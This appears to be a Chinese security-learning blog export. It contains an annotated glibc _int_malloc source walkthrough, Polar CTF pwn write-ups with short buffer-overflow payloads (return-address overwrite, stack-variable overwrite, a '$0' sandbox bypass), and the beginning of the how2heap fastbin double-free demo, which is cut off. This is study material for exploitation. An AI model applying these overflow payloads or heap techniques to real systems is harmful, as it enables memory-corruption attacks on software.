<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">  &#123;<span class="comment">//large bin 中有空闲chunk 存在</span></span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert (chunk_main_arena (bck-&gt;bk));</span><br></pre></td></tr></table></figure>

<p>如果当前chunk比large bin的最后一个chunk的大小还小，那么当前chunk就插入到large bin 的链表的最后，作为最后一个 chunk。可以看出 large bin 中的 chunk 是按照从大到小的 顺序排序的，同时一个 chunk 存在于两个双向循环链表中，一个链表包含了 large bin 中所有 的chunk，另一个链表为chunk size 链表，该链表从每个相同大小的chunk 的取出第一个chunk 按照大小顺序链接在一起，便于一次跨域多个相同大小的 chunk 遍历下一个不同大小的 chunk，这样可以加快在 large bin 链表中的遍历速度。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))<span class="comment">//bck-&gt;bk是当前largebin中最小的chunk</span></span><br><span class="line">            &#123;<span class="comment">//直接链入largebin</span></span><br><span class="line">              fwd = bck;</span><br><span class="line">              bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">              victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>

<p>正向遍历 <strong>chunk size 链表</strong>，直到找到第一个 chunk 大小小于等于当前 chunk 大小的 chunk 退出循环。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span></span><br><span class="line">               &#123;<span class="comment">//即等于或大于fwd的size</span></span><br><span class="line">                 assert (chunk_main_arena (fwd));</span><br><span class="line">                 <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                   &#123;<span class="comment">//正向遍历largebin</span></span><br><span class="line">                     fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">                   &#125;</span><br></pre></td></tr></table></figure>

<p>如果从 large bin 链表中找到了与当前 chunk 大小相同的 chunk，则同一大小的 chunk 已 经存在，那么 chunk size 链表中一定包含了fwd 所指向的 chunk，为了不修改 chunk size 链 表，当前 chunk 只能插入 fwd 之后。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">                 <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">== (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))<span class="comment">//直到等于fwd的情况成立</span></span><br><span class="line">                   <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                   fwd = fwd-&gt;fd;<span class="comment">//直接链在fwd后面</span></span><br></pre></td></tr></table></figure>



<p>如果 chunk size 链表中还没有包含当前 chunk 大小的 chunk，也就是说当前 chunk 的大小大于 fwd 的大小，则将当前 chunk 作为该 chunk size 的代表加入 chunk size 链表，chunk size 链表也是按照由大到小的顺序排序。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                   victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                   victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                   <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                     malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted 									  (nextsize)&quot;</span>);</span><br><span class="line">                   fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                   victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                 &#125;</span><br></pre></td></tr></table></figure>

<p>如果 large bin 链表中没有 chunk，直接将当前 chunk加入 chunk size 链表。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        bck = fwd-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>上面的代码将当前 chunk 插入到 large bin 的空闲 chunk 链表中，并将 large bin 所对应 binmap 的相应 bit 置位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">	 filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>最多遍历unsortedbin 10000次，后面的一部分（在use_top）之前在pwn中可能很少用到，简略分析</p>
<p>当将 unsorted bin 中的空闲 chunk 加入到相应的 small bins 和 large bins 后，将使用<strong>最佳匹配法</strong>分配 large bin chunk。源代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">   sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line"> &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (victim)</span><br><span class="line">   &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br></pre></td></tr></table></figure>

<p>如果所需分配的 chunk为 large bin chunk，查询对应的 large bin 链表，如果 large bin 链 表为空，或者链表中最大的 chunk 也不能满足要求，则不能从 large bin 中分配。否则，遍历 98 large bin 链表，找到合适的 chunk。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  victim = victim-&gt;bk_nextsize;</span><br><span class="line">  <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">    victim = victim-&gt;bk_nextsize;</span><br></pre></td></tr></table></figure>

<p>反向遍历chunk size链表(由小到大)，直到找到第一个大于等于所需chunk大小的chunk退出循环。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">             list does not have to be rerouted.  */</span></span><br><span class="line">          <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">&amp;&amp; chunksize_nomask (victim)</span><br><span class="line">  == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">            victim = victim-&gt;fd;</span><br></pre></td></tr></table></figure>

<p>如果从 large bin 链表中选取的 chunk victim 不是链表中的最后一个 chunk，并且与 victim 大小相同的chunk 不止一个，那么意味着victim 为chunk size 链表中的节点，为了不调整chunk size 链表，需要避免将 chunk size 链表中的节点取出，所以取 victim-&gt;fd 节点对应的 chunk 作为候选 chunk。由于 large bin 链表中的 chunk 也是按大小排序，同一大小的 chunk 有多个 时，这些 chunk 必定排在一起，所以 victim-&gt;fd 节点对应的 chunk 的大小必定与 victim 的大 小一样。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">remainder_size = size - nb;</span><br><span class="line">unlink_chunk (av, victim);</span><br></pre></td></tr></table></figure>

<p>计算将victim切分后剩余大小，并调用 unlink()宏函数将 victim从 large bin 链表中取出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, size);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>

<p>如果将 victim 切分后剩余大小小于 MINSIZE，则将整个 victim 分配给应用层，这种情况 下，实际分配的 chunk 比所需的 chunk 要大一些。以 64 位系统为例，remainder_size 的可能 大小为 0 和 16，如果为 0，表示victim 的大小刚好等于所需 chunk 的大小，设置 victim 的 inuse 标志，inuse 标志位于下一个相邻的 chunk 的 size 字段中。如果 remainder_size 为 16，则这 16 字节就浪费掉了。如果当前分配区不是主分配区，将 victim 的 size 字段中的非主分配区 标志置位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          <span class="comment">/* Split */</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                 have to perform a complete insert here.  */</span></span><br><span class="line">              bck = unsorted_chunks (av);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">              remainder-&gt;bk = bck;</span><br><span class="line">              remainder-&gt;fd = fwd;</span><br><span class="line">              bck-&gt;fd = remainder;</span><br><span class="line">              fwd-&gt;bk = remainder;</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>从victim 中切分出所需的chunk，剩余部分作为一个新的 chunk 加入到 unsorted bin 中。 如果剩余部分 chunk 属于large bins，将剩余部分 chunk 的 chunk size 链表指针设置为NULL， 因为 unsorted bin 中的 chunk 是不排序的，这两个指针无用，必须清零。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从 large bin中使用<strong>最佳匹配法</strong>找到了合适的 chunk，设置victim和remainder的状态，由于 remainder 为空闲 chunk，所以需要设置该 chunk 的 foot；调用 chunk2mem()获得 chunk 中可 用的内存指针，返回给应用层，退出。</p>
<p>如果通过上面的方式从最合适的 small bin 或 large bin 中都<strong>没有分配到需要的chunk</strong>，则 查看比当前 bin 的 index 大的 small bin 或 large bin 是否有空闲 chunk 可利用来分配所需的 chunk。源代码实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         通过扫描bins来搜索chunk，从下一个较大的bin开始。</span></span><br><span class="line"><span class="comment">         这个搜索严格遵循最佳适配原则；即选择适合的最小块（在平局的情况下选择约最少最近使用的块）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         binmap避免了需要检查大多数块是否为空的情况。</span></span><br><span class="line"><span class="comment">         在热身阶段（即还没有返回任何块的情况下）跳过所有桶的特殊情况比看上去的要快得多。</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      ++idx;  <span class="comment">// 增加索引</span></span><br><span class="line">      bin = bin_at(av, idx);  <span class="comment">// 获取当前索引对应的桶</span></span><br><span class="line">      block = idx2block(idx);  <span class="comment">// 将索引转换为块</span></span><br><span class="line">      <span class="built_in">map</span> = av-&gt;binmap[block];  <span class="comment">// 获取对应块的位图</span></span><br><span class="line">      bit = idx2bit(idx);  <span class="comment">// 将索引转换为位图中的位</span></span><br></pre></td></tr></table></figure>

<p>获取下一个相邻bin 的空闲chunk 链表，并获取该bin 对于binmap 中的bit 位的值。Binmap 中的标识了相应的 bin 中是否有空闲 chunk 存在。Binmap 按 block 管理，每个 block 为一个 int，共 32 个 bit，可以表示 32 个 bin 中是否有空闲 chunk 存在。使用 binmap 可以加快查找 bin 是否包含空闲 chunk。这里只查询比所需 chunk 大的 bin 中是否有空闲 chunk 可用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">              <span class="keyword">goto</span> use_top;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>Idx2bit()宏将 idx 指定的位设置为 1，其它位清零，map 表示一个 block（unsigned int） 值，如果 bit 大于 map，意味着 map 为 0，该 block 所对应的所有 bins 中都没有空闲 chunk， 于是遍历 binmap 的下一个 block，直到找到一个不为 0 的 block 或者遍历完所有的 block。 退出循环遍历后，设置 bin 指向 block 的第一个 bit 对应的 bin，并将 bit 置为 1，表示该 block 中 bit 1 对应的 bin，这个 bin 中如果有空闲 chunk，该 chunk 的大小一定满足要求。</p>
<p>….过了</p>
<p>如果从所有的 bins 中都没有获得所需的 chunk，可能的情况为 bins 中没有空闲 chunk， 或者所需的 chunk 大小很大，下一步将尝试从 top chunk 中分配所需 chunk。源代码实现如 下：</p>
<h3 id="use-top"><a href="#use-top" class="headerlink" title="use_top"></a>use_top</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">     (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">     less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">     be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">     limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">     MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">     exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">     reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">     to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br></pre></td></tr></table></figure>

<p>将当前分配区的top chunk赋值给 victim，并获得 victim 的大小。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;<span class="comment">//topchunk够用</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>由于 top chunk 切分出所需 chunk 后，还需要 MINSIZE 的空间来作为fencepost，所需必须满足 top chunk 的大小大于所需 chunk 的大小加上 MINSIZE 这个条件，才能从 top chunk 中分配所需 chunk。从 top chunk 切分出所需 chunk 的处理过程跟前面的 chunk 切分类似， 不同的是，原 top chunk 切分后的剩余部分将作为新的 top chunk，原 top chunk 的 fencepost 仍然作为新的top chunk 的 fencepost，所以切分之后剩余的 chunk 不用 set_foot。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">   here for all block sizes.  */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">    <span class="comment">/* restore original bin index */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>如果 top chunk 也不能满足要求，<strong>查看 fast bins 中是否有空闲 chunk 存在</strong>，由于开启了 ATOMIC_FASTBINS 优化情况下，free 属于 fast bins 的 chunk 时不需要获得分配区的锁，所以在调用_int_malloc()函数时，有可能有其它线程已经向 fast bins 中加入了新的空闲 chunk，也有可能是所需的 chunk 属于 small bins，但通过前面的步骤都没有分配到所需的 chunk，由于 分配 small bin chunk 时在前面的步骤都不会调用 malloc_consolidate()函数将 fast bins 中的 chunk 合并加入到 unsorted bin 中。所在这里如果 fast bin 中有 chunk 存在， 调用 malloc_consolidate()函数，并重新设置当前 bin 的 index。并转到最外层的循环，尝试重新分 配 small bin chunk 或是 large bin chunk。如果开启了 ATOMIC_FASTBINS 优化，有可能在由其 它线程加入到fast bins 中的 chunk 被合并后加入 unsorted bin 中，从 unsorted bin 中就可以 分配出所需的 large bin chunk 了，所以对没有成功分配的 large bin chunk 也需要重试。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>山穷水尽了，只能想系统申请内存了。sysmalloc()函数可能分配的 chunk 包括 small bin chunk，large bin chunk 和 large chunk。</p>
<p>至此，_int_malloc()函数的代码就罗列完了，当还有两个关键函数没有分析，一个为 malloc_consolidate()，另一个为 sysmalloc()。</p>
<h2 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate()"></a>malloc_consolidate()</h2>]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Polar ctf</title>
    <url>/2025/04/24/polarctf(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/</url>
    <content><![CDATA[<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><h2 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h2><p>输入 $0 即可绕过那几个检查</p>
<p> <strong>1. <code>$0</code> 的基本含义</strong></p>
<ul>
<li><strong>在脚本中</strong>：<code>$0</code> 表示正在运行的脚本名称。<br>例如，执行脚本 <code>./test.sh</code> 时，<code>$0</code> 的值是 <code>./test.sh</code>。</li>
<li><strong>在交互式 Shell 中</strong>：<code>$0</code> 表示当前 Shell 的名称（如 <code>bash</code>、<code>sh</code>、<code>zsh</code>）。<br>例如，在 Bash 中输入 <code>echo $0</code>，输出通常是 <code>bash</code>。</li>
</ul>
<h2 id="creeper"><a href="#creeper" class="headerlink" title="creeper"></a>creeper</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">game</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Creeper?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(buf) == <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Aw man&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Si............&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入15个字符就行，如：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">aaaabbbbaaaabb\n</span><br></pre></td></tr></table></figure>

<h2 id="hahaha"><a href="#hahaha" class="headerlink" title="hahaha"></a>hahaha</h2><p>后门直接溢出就行，高版本需要有栈平衡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>) + p64(<span class="number">0x0000000000400441</span>) + p64(<span class="number">0x400596</span>)</span><br><span class="line">sl(payload)	</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p>溢出改栈上的变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ps = <span class="string">b&quot;lovecat&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0x74616365766F6C</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>how2heap</title>
    <url>/2025/04/25/how2heap/</url>
    <content><![CDATA[<h1 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc 2.31"></a>glibc 2.31</h1><p>docker-ubuntu-20.04- 2.31-0ubuntu9.16</p>
<p><code>calloc()</code> 函数用于分配一块内存，并初始化所有字节为零。它通常用于需要分配多个元素的数组或结构体，并且希望在分配时将它们的初始值设置为零。<strong>它绕过tcache来分配内存</strong></p>
<p><strong>函数原型</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> num, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong></p>
<ul>
<li><code>num</code>：要分配的元素数量。</li>
<li><code>size</code>：每个元素的字节大小。</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li>成功时，返回指向分配内存块的指针（类型为 <code>void*</code>）。</li>
<li>如果分配失败，返回 <code>NULL</code>。</li>
</ul>
<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>效果：实现 double free</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, 